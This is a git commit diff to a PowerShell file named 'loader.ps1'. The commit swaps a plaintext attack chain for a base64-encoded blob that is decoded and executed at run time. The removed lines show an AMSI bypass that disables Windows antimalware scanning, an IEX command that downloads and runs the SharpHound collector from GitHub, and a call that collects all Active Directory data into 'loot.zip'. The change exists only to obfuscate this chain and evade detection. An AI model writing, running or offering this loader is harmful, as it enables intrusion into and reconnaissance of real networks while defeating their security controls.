6219a69a2def47ed5b68f9e9004cb56c062d673c
Tyler the Pug <50224819+tylerwhardy@users.noreply.github.com>
2025-07-06 20:09:30 -0400

    Update loader.ps1

--- loader.ps1
+++ loader.ps1
@@ -1,10 +1,10 @@
-$pre = '[ScriptBlock]::Create('
-$amsiBypass = '"[Ref].Assembly.GetType(""System.Management.Automation.AmsiUtils"").GetField(""amsiInitFailed"",''NonPublic,Static'').SetValue($null,$true);"'
-$download = '"IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/master/Collectors/SharpHound.ps1'');"'
-$run = '"Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip"'
-$post = ')'
+$encoded = @"
+W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgic3lzdGVtLm1hbmFnZW1lbnQuYXV0b21hdGlvbi5hbXNpdXRpbHMiKS5HZXRGaWVsZCgiYW1zaUluaXRGYWlsZWQiLCJOb25QdWJsaWMsU3RhdGljIikud
+FNldFZhbHVlKCRudWxsLHRydWU7CklFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NwZWN0ZXJP
+cHMvQmxvb2RIb3VuZC1MZWdhY3kvbWFzdGVyL0NvbGxlY3RvcnMvU2hhcnBIb3VuZC5wc2MiKTsKSW52b2tlLUJsb29kSG91bmQgLUNvbGxlY3Rpb25NZXRob2QgQWxsIC1a
+aXBGaWxlTmFtZSBsb290LnppcA==
+"@ -replace "`r|`n", ""
 
-$payload = $pre + $amsiBypass + $download + $run + $post
-
-$sb = Invoke-Expression $payload
+$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
+$sb = [ScriptBlock]::Create($decoded)
 & $sb
